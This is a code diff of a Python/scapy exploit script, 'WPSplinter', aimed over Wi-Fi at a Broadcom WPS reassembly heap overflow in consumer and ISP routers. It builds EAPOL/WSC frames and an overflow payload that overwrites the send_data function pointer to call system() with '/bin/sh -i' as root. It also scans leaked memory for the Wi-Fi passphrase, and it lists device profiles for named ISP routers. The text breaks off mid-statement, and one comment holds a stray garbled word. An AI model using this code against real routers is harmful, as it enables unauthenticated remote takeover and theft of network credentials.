@@ -1,1487 +1,923 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+WPSplinter v8 - Broadcom WPS Monitor Exploit
+============================================
+Exploit für die Broadcom-WPS-EAP-Fragment-Reassembly-Schwachstelle
+("WPSplinter", Hexacon 2026, Quentin Kaiser).
+
+WICHTIG: Es existiert KEIN CVE. Broadcom hat die Zuweisung einer CVE
+abgelehnt; "WPSplinter" ist ein von der Forschung vergebener Name [1].
+
+Referenzen:
+  [1] https://qkaiser.github.io/broadcom-wps/
+  [2] https://quentinkaiser.be/security/2026/10/16/one-parser-two-bugs/
+  [10] https://github.com/qkaiser/broadcom-wps
+
+Betroffene Plattformen (SoC-Familien) [1]:
+  - eCos:    BCM3380, BCM3383, BCM33834
+  - Linux:   BCM3390, BCM63xx, BCM65xx, BCM68xx
+  - "forever day" auf eCos-Geräten (kein Fix verfügbar) [4]
+
+Auswirkungen: unauthentifizierte, über Funk erreichbare
+Speicheroffenlegung (inkl. WLan-PSK) und Code-Ausführung als root [1][2].
+
+Requirements: Python 3.8+, scapy >= 2.4.5, Interface im Monitor-Modus
+"""
 
 import argparse
 import logging
 import os
-import re
 import struct
 import subprocess
 import sys
 import time
 
-try:
-    from scapy.all import (
-        sendp, sniff, wrpcap,
-        Ether, RadioTap, Dot11, Dot11Elt, Dot11Auth,
-        Dot11Assoctest, EAPOL, EAP, Raw, RandMAC, conf
-    )
-except ImportError as e:
-    print(f"[!] Scapy import error: {e}")
-    print("[!] Install with: pip install scapy")
-    sys.exit(1)
-
-# =============================================================================
-# Logging
-# =============================================================================
-logging.basicConfig(
-    level=logging.INFO,
-    format='[%(asctime)s] %(levelname)s: %(message)s',
-    datefmt='%Y-%m-%d %H:%M:%S'
+from scapy.all import (
+    sendp, sniff, wrpcap, conf,
+    RadioTap, Dot11, Dot11Elt, Dot11Auth,
+    LLC, SNAP, Raw, RandMAC,
 )
-logger = logging.getLogger(__name__)
+from scapy.layers.dot11 import Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas
+
+ETH_P_PAE = 0x888E                 # EAPOL EtherType
+MAC_FRAGMENT_SIZE = 235             # max 802.11-MAC-Fragmentgröße (Wert des
+                                     # offiziellen Fingerprinters [10])
+
+logging.basicConfig(level=logging.INFO,
+                    format='[%(asctime)s] %(levelname)s: %(message)s',
+                    datefmt='%H:%M:%S')
+logger = logging.getLogger("wpsplinter")
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 # =============================================================================
-# Protocol Constants (WPS/WSC over EAP-Expanded)
+# Protokoll-Konstanten (WPS/WSC über EAP-Expanded)
 # =============================================================================
 
-# EAP Constants
-EAP_CODE_REQUEST = 1
-EAP_CODE_RESPONSE = 2
-EAP_CODE_SUCCESS = 3
-EAP_CODE_FAILURE = 4
+# --- EAP -------------------------------------------------------------------
+EAP_CODE_REQUEST, EAP_CODE_RESPONSE = 1, 2
+EAP_CODE_SUCCESS,  EAP_CODE_FAILURE  = 3, 4
 EAP_TYPE_IDENTITY = 1
-EAP_TYPE_EXPANDED = 254
+EAP_TYPE_EXPANDED = 254  # 0xFE
 
-# WPS/WSC Constants
-WPS_VENDOR_ID = 0x00372A      # 3 bytes: 00 37 2A (Wi-Fi Alliance)
-WPS_VENDOR_TYPE = 0x00000001  # 4 bytes: SimpleConfig/WSC
+# --- EAPOL ------------------------------------------------------------------
+# Nummerierung wie im offiziellen Fingerprinter [10]:
+#   EAPOL-Start : Version=2, Type=1, Length=0
+#   EAP-Packet  : Version=1, Type=0
+EAPOL_START_BYTES = b"\x02\x01\x00\x00"
+EAPOL_VERSION_EAP = 0x01
+EAPOL_TYPE_EAP    = 0x00
 
-# WSC Opcodes (Op-Code field in WSC header)
-WPS_OP_START = 0x01
-WPS_OP_ACK = 0x02
-WPS_OP_NACK = 0x03
-WPS_OP_M1 = 0x04
-WPS_OP_M2 = 0x05
-WPS_OP_M2D = 0x06
-WPS_OP_M3 = 0x07
-WPS_OP_M4 = 0x08
-WPS_OP_M5 = 0x09
-WPS_OP_M6 = 0x0A
-WPS_OP_M7 = 0x0B
-WPS_OP_M8 = 0x0C
-WPS_OP_WSC_DONE = 0x0E
-WPS_OP_FRAG_ACK = 0x03
+# --- WSC (EAP-Expanded Vendor-Bereich) --------------------------------------
+WPS_VENDOR     = b"\x00\x37\x2a"          # Vendor-ID: Wi-Fi Alliance
+WPS_VENDOR_TYPE = b"\x00\x00\x00\x01"      # Vendor-Type: Simple Config
 
-# WSC Flags (second byte in WSC header)
-WSC_FLAG_MF = 0x01    # More Fragments
-WSC_FLAG_LF = 0x02    # Length field present
-WSC_FLAG_FLAGS_ONLY = 0x04  # Empty message (flags only)
+# WSC-OpCodes: Im Broadcom SDK existieren separate M-OpCodes; hostapd nutzt
+# das generische WSC_MSG=0x04 für M1. 0x04 ist in beiden Schemata gültig.
+WSC_OP_START  = 0x01
+WSC_OP_ACK    = 0x02
+WSC_OP_NACK   = 0x03
+WSC_OP_MSG_M1 = 0x04
+WSC_OP_M2     = 0x05
+WSC_OP_M2D    = 0x06
+# FRAG-ACK: je nach Implementierung wird OpCode 0x0f (Wi-Fi-SC-Spez.)
+# oder 0x03 gemeldet – wir akzeptieren beide [10].
+WSC_OP_FRAG_ACK_CANDIDATES = (0x03, 0x0F)
 
-# WSC TLV Types (big-endian)
-WSC_TLV_MSG_TYPE = 0x1022
-WSC_TLV_VERSION = 0x104A
-WSC_TLV_UUID_E = 0x1047
-WSC_TLV_MAC_ADDR = 0x1020
-WSC_TLV_ENROLLEE_NONCE = 0x101A
-WSC_TLV_PUBLIC_KEY = 0x1032
-WSC_TLV_AUTH_TYPE_FLAGS = 0x1003
-WSC_TLV_ENCR_TYPE_FLAGS = 0x100F
-WSC_TLV_CONN_TYPE_FLAGS = 0x1007
-WSC_TLV_CONFIG_METHODS = 0x1008
-WSC_TLV_PRIMARY_DEV_TYPE = 0x1054
-WSC_TLV_DEVICE_NAME = 0x1011
-WSC_TLV_RF_BANDS = 0x103C
-WSC_TLV_ASSOC_STATE = 0x1002
-WSC_TLV_DEVICE_PW_ID = 0x1012
-WSC_TLV_VENDOR_EXT = 0x1049
-WSC_TLV_REQUEST_TYPE = 0x103A
+# WSC-Flags (Byte nach dem OpCode)
+WSC_FLAG_MF = 0x01   # More Fragments
+WSC_FLAG_LF = 0x02   # Length-Field vorhanden
 
-# WSC Message Types (for TLV 0x1022)
-WSC_MSG_M1 = 0x04
-WSC_MSG_M2 = 0x05
-WSC_MSG_M2D = 0x06
-WSC_MSG_M3 = 0x07
-WSC_MSG_M7 = 0x0B
+WFA_IDENTITY = b"wfa-simpleconfig-enrollee-1-0"
 
-# Broadcom WPS Monitor reassembly buffer constants
-# (from firmware analysis of wps_monitor binary)
-FRAGS_CAP = 2048            # Size of frags_received[0] buffer
-SZ_HDR = 14                 # WSC header overhead (opcode + flags + optional length)
-WPS_EAP_MAX_FRAG = 1024    # Maximum single fragment payload size
+# --- Broadcom wps_monitor Reassembly-State (Overflow-Ziel) -------------------
+# Werte wie im Ursprungsskript ("firmware-verified") als Standard; pro Firmware
+# über CLI-Overrides anpassbar. Offsets sind relativ zum Pufferanfang:
+#   0..2047                 -> frags_received[0]
+#   ab 2048                 -> angrenzende State-Felder
+FRAGS_CAP        = 2048
+OFF_TOTAL_BYTES  = FRAGS_CAP          # total_bytes_to_recv
+OFF_TOTAL_RECV   = FRAGS_CAP + 4     # total_received
+OFF_NEXT_FRAG    = FRAGS_CAP + 8     # next_frag_to_send
+OFF_FRAG_SIZE    = FRAGS_CAP + 12    # frag_size
+OFF_FLAGS        = FRAGS_CAP + 24    # flags
+OFF_LAST_SENT    = FRAGS_CAP + 28    # last_sent (Zeiger)
+OFF_LAST_SENT_LEN= FRAGS_CAP + 32    # last_sent_len
+OFF_SEND_DATA    = FRAGS_CAP + 56    # send_data (Funktionszeiger)
 
-# State struct field offsets (relative to start of buffer, post-overflow):
-# These represent offsets PAST frags_received[0] into adjacent memory
-OFF_FRAGS_RECEIVED = 0
-OFF_TOTAL_BYTES = FRAGS_CAP          # total_bytes_to_recv (4 bytes)
-OFF_TOTAL_RECEIVED = FRAGS_CAP + 4   # total_received (4 bytes)
-OFF_NEXT_FRAG = FRAGS_CAP + 8        # next_frag_to_send (4 bytes)
-OFF_FRAG_SIZE = FRAGS_CAP + 12       # frag_size (4 bytes)
-OFF_FLAGS = FRAGS_CAP + 24           # flags (4 bytes)
-OFF_LAST_SENT = FRAGS_CAP + 28       # last_sent pointer (4 bytes)
-OFF_LAST_SENT_LEN = FRAGS_CAP + 32  # last_sent_len (4 bytes)
-OFF_SEND_DATA = FRAGS_CAP + 56       # send_data function pointer (4 bytes)
+# --- PSK-Erkennung -----------------------------------------------------------
+PSK_MIN_LEN, PSK_MAX_LEN = 8, 63
+PSK_MARKERS = [b'wpa_psk', b'wpa_passphrase', b'pre_shared_key',
+               b'psk=', b'WPA PSK']
+PSK_SCAN_OFFSETS = [0x1000, 0x2000, 0x3000, 0x4000, 0x5000]
 
-# EAPOL constants
-EAPOL_VERSION = 1
-EAPOL_TYPE_EAP_PACKET = 1
-EAPOL_TYPE_START = 1
-EAPOL_TYPE_LOGOFF = 2
-
-# IEEE 802.11 constants
-DOT11_TYPE_MGMT = 0
-DOT11_SUBTYPE_ASSOC_REQ = 0
-DOT11_ADDR_AP = 1  # addr1 = BSSID (receiver)
-DOT11_ADDR_STA = 2  # addr2 = source MAC (transmitter)
-
-# PSK Detection
-PSK_MIN_LEN = 8
-PSK_MAX_LEN = 63
-PSK_MARKERS = [
-    b'wpa_psk',
-    b'wpa_passphrase',
-    b'pre_shared_key',
-    b'WPA PSK',
-    b'psk=',
-]
-PSK_SCAN_OFFSETS = [0x0000, 0x0800, 0x1000, 0x1800, 0x2000]
-
-# Default PLT addresses (TP-Link Archer C7, ARM, firmware-specific)
-DEFAULT_PLT = {
-    'arm': {
-        'system': 0x000211d0,
-        'malloc': 0x00009a04,
-        'strcpy': 0x00009e78,
-        'printf': 0x00009fc4,
-        'sprintf': 0x00009d70,
-        'snprintf': 0x00009ad0,
-        'free': 0x00009dd0,
-    },
-    'mips': {
-        'system': 0x00425304,
-        'malloc': 0x00418b38,
-        'strcpy': 0x00425308,
-        'printf': 0x00419a50,
-        'free': 0x00419b60,
-    }
+# --- Geräteprofile (Auswahl bestätigter Geräte aus [1]) ----------------------
+# RCE-Konstanten sind CODESUBSTR firmware-spezifisch. Wo keine publizierten
+# Adressen existieren, ist 'system_plt' None -> --system_plt erzwingen.
+DEVICE_PROFILES = {
+    # Name: (arch, endianness, system_plt oder None, Hinweis)
+    "bbox3v":        ("mips", "big",    None, "Sagemcom/Proximus BBOX 3V+"),
+    "tcg3000":       ("arm",  "little", None, "ASKEY TCG3000 (Orange BE)"),
+    "cg3100":        ("mips", "big",    None, "Netgear CG3100 (VOO)"),
+    "cg3700":        ("mips", "big",    None, "Netgear CG3700 (VOO)"),
+    "tc7210":        ("arm",  "little", None, "Technicolor TC7210 (VOO)"),
+    "cga4233":       ("arm",  "little", None, "Technicolor CGA4233 (VOO)"),
+    "actiontec":     ("arm",  "little", None, "Actiontec C1000A/C3000A (CenturyLink)"),
+    "generic-arm":   ("arm",  "little", None, "Generisch: BCM3390/68xx Linux"),
+    "generic-mips":  ("mips", "big",    None, "Generisch: BCM3380/3383 eCos"),
 }
 
-SHELL_CMD = b"/bin/sh\x00"
+SHELL_CMD = b"/bin/sh -i\x00"
 
 
 # =============================================================================
-# Packet Construction Functions
+# EAPOL/EAP-Baukasten (Layout identisch zum offiziellen Fingerprinter [10])
 # =============================================================================
 
-def build_wsc_tlv(tlv_type: int, value: bytes) -> bytes:
-    """Build a single WSC TLV (Type-Length-Value) element."""
-    return struct.pack('>HH', tlv_type, len(value)) + value
+def build_eapol(eap_body: bytes, version: int = EAPOL_VERSION_EAP,
+               ptype: int = EAPOL_TYPE_EAP) -> bytes:
+    """EAPOL-Frame: Version, Type, Length(BE16) + Body."""
+    return struct.pack(">BBH", version, ptype, len(eap_body)) + eap_body
 
 
-def build_wsc_tlvs(tlvs) -> bytes:
-    """Build multiple WSC TLVs from a list of (type, value) tuples."""
-    data = b''
-    for tlv_type, value in tlvs:
-        data += build_wsc_tlv(tlv_type, value)
-    return data
+def build_eap(code: int, identifier: int, payload_after_type: bytes) -> bytes:
+    """EAP-Frame: Code, Id, Length(BE16, inkl. 4-Byte-Header), Type + Body."""
+    length = 4 + 1 + len(payload_after_type)
+    return (struct.pack(">BBHB", code, identifier, length, EAP_TYPE_EXPANDED)
+            + payload_after_type)
 
 
-def build_wsc_header(opcode: int, flags: int, length: int = None, data: bytes = b'') -> bytes:
+def build_identity_response(identifier: int) -> bytes:
+    """EAP Identity-Response mit WFA-Enrollee-Identität [10]."""
+    length = 5 + len(WFA_IDENTITY)
+    eap = struct.pack(">BBHB", EAP_CODE_RESPONSE, identifier, length,
+                     EAP_TYPE_IDENTITY) + WFA_IDENTITY
+    return build_eapol(eap)
+
+
+def build_wsc_response(identifier: int, flags: int, data: bytes) -> bytes:
     """
-    Build WSC header + optional data.
+    EAP-Expanded WSC-Response (Enrollee -> AP).
 
-    WSC header format (after EAP-Expanded vendor fields):
-      - Op-Code (1 byte): 0x04 for M1, etc.
-      - Flags (1 byte): bit 0 = More Fragments, bit 1 = Length present, bit 2 = flags only
-      - [Length (2 bytes) if Flags & 0x02]
-      - Data
+    data = Bytes NACH OpCode/Flags — also inkl. des 2-Byte-Length-Fields,
+    falls WSC_FLAG_LF gesetzt ist [10]. EAP-Length = 14 + len(data):
+      4 (Header) + 1 (Type) + 3 (VendorID) + 4 (VendorType) + 1 (OpCode)
+      + 1 (Flags) + len(data)
     """
-    body = struct.pack('>BB', opcode, flags)
-    if flags & WSC_FLAG_LF and length is not None:
-        body += struct.pack('>H', length)
-    body += data
-    return body
-
-
-def build_eap_expanded_wsc(code: int, eap_id: int, opcode: int, flags: int,
-                           data: bytes = b'', lf_total: int = None) -> bytes:
-    """
-    Build a complete raw EAP packet for EAP-Expanded WSC (Wi-Fi Simple Config).
-
-    Returns raw bytes of the EAP packet (header + Expanded body).
-
-    EAP Header (4 bytes):
-      - Code (1): 1=Request, 2=Response, 3=Success, 4=Failure
-      - Id (1): sequence number
-      - Length (2): total EAP packet length (including header)
-      - Type (1): 254 = Expanded
-
-    EAP-Expanded body:
-      - Vendor-ID (3 bytes): 00:37:2A (Wi-Fi Alliance WPS)
-      - Vendor-Type (4 bytes): 0x00000001 (WSC)
-      - Op-Code (1 byte): message opcode
-      - Flags (1 byte): control flags
-      - [Length (2 bytes)]: if L flag set
-      - Message data
-    """
-    # Build WSC body
-    wsc_flags = flags
-    if lf_total is not None:
-        wsc_flags |= WSC_FLAG_LF
-
-    wsc_body = struct.pack('>BB', opcode, wsc_flags)
-    if lf_total is not None:
-        wsc_body += struct.pack('>H', lf_total)
-    wsc_body += data
-
-    # Build EAP-Expanded vendor-specific body
-    expanded_body = struct.pack('>3B', 0x00, 0x37, 0x2A)  # Vendor-ID: WPS
-    expanded_body += struct.pack('>I', WPS_VENDOR_TYPE)     # Vendor-Type: WSC
-    expanded_body += wsc_body
-
-    # Build EAP header
-    eap_len = 4 + len(expanded_body)  # 4-byte header + Expanded body
-    eap_raw = struct.pack('>BBHB', code, eap_id, eap_len, EAP_TYPE_EXPANDED)
-    eap_raw += expanded_body
-
-    return eap_raw
-
-
-def build_eap_identity_response(eap_id: int, identity: bytes = b'') -> bytes:
-    """Build raw EAP Identity Response packet."""
-    eap_len = 5 + len(identity)  # 5 bytes: code, id, len, type, [identity]
-    eap_raw = struct.pack('>BBHB', EAP_CODE_RESPONSE, eap_id, eap_len,
-                          EAP_TYPE_IDENTITY)
-    eap_raw += identity
-    return eap_raw
-
-
-def build_eap_nak_response(eap_id: int) -> bytes:
-    """Build raw EAP NAK (Response/Type=3) packet for non-accepted types."""
-    eap_len = 6  # 5 header + 1 proposed type
-    eap_raw = struct.pack('>BBHB', EAP_CODE_RESPONSE, eap_id, eap_len, 3)
-    eap_raw += struct.pack('>B', EAP_TYPE_EXPANDED)  # Propose EAP-Expanded
-    return eap_raw
-
-
-def build_eapol(eap_raw: bytes, eapol_type: int = EAPOL_TYPE_EAP_PACKET) -> bytes:
-    """
-    Build raw EAPOL frame (802.1X).
-    Returns raw bytes of EAPOL (without Ethernet header).
-
-    EAPOL header (4 bytes):
-      - Version (1): 1 = 802.1X-2001
-      - Type (1): 0=Start, 1=EAP-Packet, 2=Logoff, 3=Key, 4=Encapsulated-ASF-Alert
-      - Length (2): Length of body
-    """
-    eapol_raw = struct.pack('>BBH', EAPOL_VERSION, eapol_type, len(eap_raw))
-    eapol_raw += eap_raw
-    return eapol_raw
-
-
-def build_eapol_start() -> bytes:
-    """Build raw EAPOL-Start packet (no body)."""
-    return struct.pack('>BBH', EAPOL_VERSION, EAPOL_TYPE_START, 0)
+    length = 14 + len(data)
+    eap = (struct.pack(">BBHB", EAP_CODE_RESPONSE, identifier, length,
+                      EAP_TYPE_EXPANDED)
+           + WPS_VENDOR + WPS_VENDOR_TYPE
+           + struct.pack(">BB", WSC_OP_MSG_M1, flags)
+           + data)
+    return build_eapol(eap)
 
 
 # =============================================================================
-# M1 Construction (Full WSC M1 Message)
+# AP-Antwort-Parser
 # =============================================================================
 
-def build_wsc_m1(enrollee_mac: bytes) -> bytes:
-    """
-    Build a complete WSC M1 message with standard TLVs.
+class ApEap:
+    """Zerlegte EAP-Antwort des Access Points."""
+    __slots__ = ("code", "identifier", "raw", "opcode", "flags", "lf",
+                 "wsc_data")
 
-    M1 contains:
-      - Version (1 byte)
-      - Message Type (1 byte, must be 0x04 = M1)
-      - UUID-E (16 bytes)
-      - MAC Address (6 bytes)
-      - Enrollee Nonce (16 bytes)
-      - Public Key (192 bytes)
-      - Auth Type Flags (2 bytes)
-      - Encryption Type Flags (2 bytes)
-      - Connection Type Flags (1 byte)
-      - Configuration Methods (2 bytes)
-      - ... other optional TLVs ...
-    """
-    import hashlib
-    import uuid as uuid_module
+    def __init__(self, code, identifier, eap):
+        self.code, self.identifier, self.raw = code, identifier, eap
+        self.opcode = self.flags = self.lf = None
+        self.wsc_data = b""
+        if (len(eap) >= 14 and eap[4] == EAP_TYPE_EXPANDED
+                and eap[5:8] == WPS_VENDOR and eap[8:12] == WPS_VENDOR_TYPE):
+            self.opcode = eap[12]
+            self.flags = eap[13]
+            pos = 14
+            if self.flags & WSC_FLAG_LF:
+                if len(eap) < pos + 2:
+                    return
+                self.lf = int.from_bytes(eap[pos:pos + 2], "big")
+                pos += 2
+            self.wsc_data = eap[pos:]
 
-    # Generate enrollee data
-    mac_bytes = enrollee_mac
-    uuid_e = bytes(uuid_module.uuid4().bytes)  # Random UUID as enrollee UUID
-    nonce = os.urandom(16)  # 128-bit enrollee nonce
-    public_key = b'\x00' * 192  # Placeholder (not needed for overflow)
-    device_name = b'wpsplinter'
-    manufacturer = b'WPSplinter'
-    model_name = b'exploit'
-    model_number = b'1.0'
-    serial_number = b'0000001'
-    primary_device_type = struct.pack('>BHH', 1, 0, 0) + mac_bytes  # Category + OUI + OUI type + sub-category
-    request_type = b'\x00'  # Enrollee
-    rf_bands = b'\x01'  # 2.4 GHz
-    assoc_state = struct.pack('>H', 0)  # Not associated
-    config_methods = struct.pack('>H', 0x0008)  #PushButton
-    dev_password_id = struct.pack('>H', 0x0000)  # Default (PIN)
 
-    version = b'\x10'  # WSC version 1.0
-    msg_type = struct.pack('>H', 0x04)  # M1
-
-    tlvs = [
-        (WSC_TLV_VERSION, version),
-        (WSC_TLV_MSG_TYPE, msg_type),
-        (WSC_TLV_UUID_E, uuid_e),
-        (WSC_TLV_MAC_ADDR, mac_bytes),
-        (WSC_TLV_ENROLLEE_NONCE, nonce),
-        (WSC_TLV_PUBLIC_KEY, public_key),
-        (WSC_TLV_AUTH_TYPE_FLAGS, struct.pack('>H', 0x0020)),  # WPA2PSK
-        (WSC_TLV_ENCR_TYPE_FLAGS, struct.pack('>H', 0x0008)),  # AES
-        (WSC_TLV_CONN_TYPE_FLAGS, b'\x01'),  # ESS
-        (WSC_TLV_CONFIG_METHODS, config_methods),
-        (WSC_TLV_PRIMARY_DEV_TYPE, primary_device_type + b'\x00\x00'),
-        (WSC_TLV_RF_BANDS, rf_bands),
-        (WSC_TLV_ASSOC_STATE, assoc_state),
-        (WSC_TLV_DEVICE_PW_ID, dev_password_id),
-        (WSC_TLV_DEVICE_NAME, device_name),
-        (WSC_TLV_MANUFACTURER, manufacturer),
-        (WSC_TLV_MODEL_NAME, model_name),
-        (WSC_TLV_MODEL_NUMBER, model_number),
-        (WSC_TLV_SERIAL_NUMBER, serial_number),
-        (WSC_TLV_REQUEST_TYPE, request_type),
-    ]
-
-    return build_wsc_tlvs(tlvs)
+def parse_eapol(eapol: bytes):
+    """EAPOL -> (code, identifier, eap) oder None (Layout aus [10])."""
+    if len(eapol) < 8 or eapol[1] != 0:
+        return None
+    eapol_length = int.from_bytes(eapol[2:4], "big")
+    eap = eapol[4:4 + eapol_length]
+    if len(eap) < 4:
+        return None
+    declared = int.from_bytes(eap[2:4], "big")
+    if declared < 4 or len(eap) < declared:
+        return None
+    return eap[0], eap[1], eap[:declared]
 
 
 # =============================================================================
-# Overflow Payload Builder
+# WSC-M1 (Standard-TLVs)
+# =============================================================================
+
+WSC_TLV_VERSION     = 0x104A
+WSC_TLV_MSG_TYPE    = 0x1022
+WSC_TLV_UUID_E      = 0x1047
+WSC_TLV_MAC_ADDR    = 0x1020
+WSC_TLV_NONCE       = 0x101A
+WSC_TLV_PUBLIC_KEY  = 0x1032
+WSC_TLV_AUTH_FLAGS  = 0x1003
+WSC_TLV_ENCR_FLAGS  = 0x100F
+WSC_TLV_CONN_FLAGS  = 0x1007
+WSC_TLV_CONFIG_METH = 0x1008
+WSC_TLV_RF_BANDS    = 0x103C
+WSC_TLV_ASSOC_STATE = 0x1002
+WSC_TLV_DEVICE_NAME = 0x1011
+WSC_TLV_REQUEST_T   = 0x103A
+
+
+def build_wsc_m1(sta_mac: bytes) -> bytes:
+    """Vollständige (formal gültige) M1-Nachricht mit Zufallsdaten."""
+    tlvs = b""
+    def tlv(t, v):
+        return struct.pack(">HH", t, len(v)) + v
+    tlvs += tlv(WSC_TLV_VERSION, b"\x10")
+    tlvs += tlv(WSC_TLV_MSG_TYPE, b"\x04")                 # M1
+    tlvs += tlv(WSC_TLV_UUID_E, os.urandom(16))
+    tlvs += tlv(WSC_TLV_MAC_ADDR, sta_mac)
+    tlvs += tlv(WSC_TLV_NONCE, os.urandom(16))
+    tlvs += tlv(WSC_TLV_PUBLIC_KEY, b"\x11" * 192)         # Platzhalter
+    tlvs += tlv(WSC_TLV_AUTH_FLAGS, struct.pack(">H", 0x0020))
+    tlvs += tlv(WSC_TLV_ENCR_FLAGS, struct.pack(">H", 0x0008))
+    tlvs += tlv(WSC_TLV_CONN_FLAGS, b"\x01")
+    tlvs += tlv(WSC_TLV_CONFIG_METH, struct.pack(">H", 0x0008))
+    tlvs += tlv(WSC_TLV_RF_BANDS, b"\x01")
+    tlvs += tlv(WSC_TLV_ASSOC_STATE, struct.pack(">H", 0))
+    tlvs += tlv(WSC_TLV_DEVICE_NAME, b"wpsplinter")
+    tlvs += tlv(WSC_TLV_REQUEST_T, b"\x00")
+    return tlvs
+
+
+# =============================================================================
+# Overflow-Payload-Builder
 # =============================================================================
 
 class OverflowPayload:
-    """Builder for heap overflow payload targeting Broadcom WPS Monitor."""
+    """
+    Baut den Heap-Overflow-Payload für den wps_monitor-Reassembly-Puffer.
 
-    def __init__(self, initial_size: int = FRAGS_CAP):
-        self.buffer = bytearray(initial_size)
-        self.overflow_writes = {}  # offset -> bytes
-        self.overflow_offset = initial_size
+    - set_buffer_data(): schreibt in frags_received[0] (Bereich 0..2047).
+      Wichtig für RCE: Der Befehlsstring muss hier ganz vorne stehen, weil
+      last_sent (Pointer auf den Pufferanfang) unverändert bleiben kann und
+      send_data(buf, len) dann system(cmd) mit dem Pufferanfang aufruft.
+    - write_overflow(): schreibt hinter FRAGS_CAP in die State-Felder.
+    """
+
+    def __init__(self):
+        self.buffer = bytearray(FRAGS_CAP)
+        self.overflow = {}
 
     def set_buffer_data(self, offset: int, data: bytes):
-        """Write data within the initial buffer (pre-overflow region)."""
-        if offset < 0:
-            raise ValueError("Offset must be >= 0")
         end = offset + len(data)
-        if end > len(self.buffer):
-            # Extend the buffer if needed
-            self.buffer.extend(b'\x00' * (end - len(self.buffer)))
+        if offset < 0:
+            raise ValueError("offset < 0")
+        if end > FRAGS_CAP:
+            raise ValueError("buffer data exceeds FRAGS_CAP")
         self.buffer[offset:end] = data
 
     def write_overflow(self, rel_offset: int, data: bytes):
-        """
-        Write data in the overflow region (past FRAGS_CAP).
-
-        rel_offset: offset relative to the start of the buffer (must be >= FRAGS_CAP)
-        data: bytes to write
-        """
         if rel_offset < FRAGS_CAP:
-            raise ValueError(f"Overflow offset must be >= {FRAGS_CAP}, got {rel_offset}")
-        self.overflow_writes[rel_offset] = data
+            raise ValueError(f"overflow offset must be >= {FRAGS_CAP}")
+        self.overflow[rel_offset] = data
 
-    def write_struct(self, rel_offset: int, value: int, fmt: str = '<I'):
-        """Write a packed integer value at overflow offset."""
-        self.write_overflow(rel_offset, struct.pack(fmt, value))
-
-    def build(self, full_m1: bool = True) -> bytes:
-        """
-        Build the complete overflow payload.
-
-        The payload consists of:
-        1. The initial buffer content (WSC M1 TLVs + padding to FRAGS_CAP)
-        2. Overflow data extending past the buffer boundary
-        """
-        if full_m1 and len(self.buffer) >= FRAGS_CAP:
-            # Pad the buffer to exactly FRAGS_CAP if we have M1 data
-            if len(self.buffer) < FRAGS_CAP:
-                self.buffer.extend(b'\x41' * (FRAGS_CAP - len(self.buffer)))
-        elif len(self.buffer) < FRAGS_CAP:
-            # Pad with 'A' characters if buffer is smaller than FRAGS_CAP
-            self.buffer.extend(b'\x41' * (FRAGS_CAP - len(self.buffer)))
-        elif len(self.buffer) > FRAGS_CAP:
-            logger.warning(f"Buffer exceeds FRAGS_CAP ({len(self.buffer)} > {FRAGS_CAP})")
-
-        # Build the overflow region
-        if not self.overflow_writes:
+    def build(self) -> bytes:
+        if not self.overflow:
             return bytes(self.buffer)
-
-        max_offset = max(off + len(data) for off, data in self.overflow_writes.items())
-        overflow_size = max_offset - FRAGS_CAP
-
-        # Create overflow region filled with padding
-        overflow_region = bytearray(b'\x00' * overflow_size)
-
-        # Apply each overflow write
-        for offset, data in self.overflow_writes.items():
-            rel_pos = offset - FRAGS_CAP
-            end = rel_pos + len(data)
-            if end > len(overflow_region):
-                overflow_region.extend(b'\x00' * (end - len(overflow_region)))
-            overflow_region[rel_pos:end] = data
-
-        return bytes(self.buffer) + bytes(overflow_region)
-
-    def build_simple(self, getter_offset: int, getter_value: int,
-                     platform: str = 'arm') -> bytes:
-        """
-        Build a simple overwrite payload for send_data function pointer.
-
-        This is the core RCE primitive: overwrite the send_data function pointer
-        to redirect execution to a chosen function (e.g., system@plt).
-        """
-        if platform == 'mips':
-            fmt = '>I'
-        else:
-            fmt = '<I'
-
-        # Fill initial buffer (can contain command string or M1 data)
-        # No specific writes needed in the buffer region
-
-        # Write function pointer overwrite
-        self.write_struct(getter_offset, getter_value, fmt)
-
-        return self.build()
+        max_end = max(off + len(d) for off, d in self.overflow.items())
+        region = bytearray(b"\x00" * (max_end - FRAGS_CAP))
+        for off, d in self.overflow.items():
+            pos = off - FRAGS_CAP
+            region[pos:pos + len(d)] = d
+        return bytes(self.buffer) + bytes(region)
 
 
 # =============================================================================
-# WPSplinter Exploit Class
+# Exploit-Klasse
 # =============================================================================
 
 class WPSplinter:
-    """Main WPSplinter exploit class."""
 
-    def __init__(self, interface: str, bssid: str, ssid: str,
-                 channel: int = None, arch: str = 'arm',
-                 verbose: bool = False, debug: bool = False):
-        """
-        Initialize WPSplinter.
-
-        Args:
-            interface: Monitor-mode WiFi interface name
-            bssid: Target AP's BSSID (MAC address)
-            ssid: Target network SSID
-            channel: WiFi channel number
-            arch: Target architecture ('arm' or 'mips')
-            verbose: Enable verbose output
-            debug: Enable debug output
-        """
-        self.interface = interface
-        self.bssid = bssid.replace(':', '').lower()
-        self.bssid_fmt = ':'.join(self.bssid[i:i+2] for i in range(0, 12, 2))
+    def __init__(self, interface, bssid, ssid, channel=None,
+                 arch="arm", big_endian=False, system_plt=None,
+                 off_total_bytes=OFF_TOTAL_BYTES,
+                 off_last_sent_len=OFF_LAST_SENT_LEN,
+                 off_send_data=OFF_SEND_DATA,
+                 dump=None, verbose=False, debug=False):
+        self.iface = interface
+        self.bssid = bssid.lower()
         self.ssid = ssid.encode() if isinstance(ssid, str) else ssid
         self.channel = channel
         self.arch = arch
-        self.big_endian = (arch == 'mips')
+        self.big_endian = big_endian
+        self.system_plt = system_plt
+        self.OFF_TOTAL = off_total_bytes
+        self.OFF_LAST_SENT_LEN = off_last_sent_len
+        self.OFF_SEND_DATA = off_send_data
+        self.dump = dump
+        self.packfmt = ">I" if big_endian else "<I"
 
-        if debug:
-            logger.setLevel(logging.DEBUG)
-        elif verbose:
-            logger.setLevel(logging.INFO)
-        else:
-            logger.setLevel(logging.WARNING)
+        self.sta = str(RandMAC()).lower()
+        self.seq = 0
+        self.assoc_ok = False
+        self.rx_seen = set()
+        self.packets = []
 
-        # State
-        self.sta_mac = None
-        self.sta_mac_fmt = None
-        self.associated = False
-        self.eap_id = 0
-        self.captured_packets = []
-
-        # Scapy configuration
+        logger.setLevel(logging.DEBUG if debug
+                        else logging.INFO if verbose else logging.WARNING)
         conf.iface = interface
+        logger.info(f"[*] iface={interface} bssid={self.bssid} "
